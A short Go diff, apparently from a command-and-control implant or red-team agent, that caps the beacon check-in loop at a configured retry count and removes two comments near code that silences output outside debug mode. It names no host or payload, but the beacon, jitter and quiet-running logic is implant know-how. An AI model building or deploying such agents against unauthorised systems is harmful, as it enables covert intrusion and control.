@@ -38,7 +38,7 @@ func suppressOutput() {
 }
 
 func beacon() {
-	for {
+	for count := 0; count < config.MaxRetries; count++ {
 		logger.Log("Starting new iteration")
 		if config.ID != "" && config.Jitter != -1 && config.Timer != -1 {
 			logger.Log("HTTP Reconnect")
@@ -99,14 +99,12 @@ func beacon() {
 }
 
 func main() {
-	// If debug, log; otherwise defer suppressing output until after plugin load
 	if config.IsDebug() {
 		logger.Warn("Debug mode enabled")
 	}
 
 	logger.Warn("Program Starting")
 
-	// Now suppress output (child plugin RPC uses inherited stdout/stderr)
 	if !config.IsDebug() {
 		suppressOutput()
 	}
